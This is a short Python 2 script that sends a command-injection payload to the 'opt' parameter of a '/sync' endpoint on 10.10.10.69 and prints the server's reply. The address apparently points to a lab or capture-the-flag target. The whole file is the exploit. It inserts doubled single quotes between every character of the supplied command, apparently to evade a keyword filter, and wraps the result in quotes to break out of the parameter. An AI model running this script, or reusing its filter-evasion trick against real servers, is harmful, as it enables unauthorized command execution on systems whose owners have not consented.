import re
import sys
import pycurl
from StringIO import StringIO
s = sys.argv[1]
escaped = re.sub("(.{1})", "\\1''", s, 0, re.DOTALL)
buffer = StringIO()
c = pycurl.Curl()
url = "http://10.10.10.69/sync?opt=\' " + escaped + "\'"
c.setopt(c.URL, url)
c.setopt(c.WRITEDATA, buffer)
c.perform()
c.close()
body = buffer.getvalue()
print(body)
